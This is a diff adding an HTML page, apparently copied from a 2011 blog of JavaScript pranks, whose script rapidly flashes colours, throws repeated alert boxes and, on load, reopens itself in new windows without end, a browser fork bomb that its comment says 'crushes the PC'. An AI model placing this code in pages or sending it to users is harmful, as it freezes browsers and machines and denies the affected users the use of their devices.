@@ -1,0 +1,33 @@
+<!-- Source: http://jsenabled.blogspot.com/2011/09/9-funniest-javascript-effects.html -->
+<!-- Opens lots of windows in the browser and crushes the PC. -->
+
+<html>
+<head>
+    <title>Unclosable Window</title>
+    <script>
+        activ = window.setInterval("Farbe()", 100);
+        farbe=1;
+        
+        function Farbe() {
+            if(farbe==1) {
+                document.bgColor="FFFF00";
+                farbe=2;
+            }else {
+                document.bgColor="FF0000";
+                farbe=1;
+            }
+            
+            alert("ok");
+        }
+
+        function erneut(){
+            window.open(self.location,'');
+        }
+        
+        window.onload = erneut;
+    </script>
+</head>
+<body>
+    <h1>Unclosable Window</h1>
+</body>
+</html>
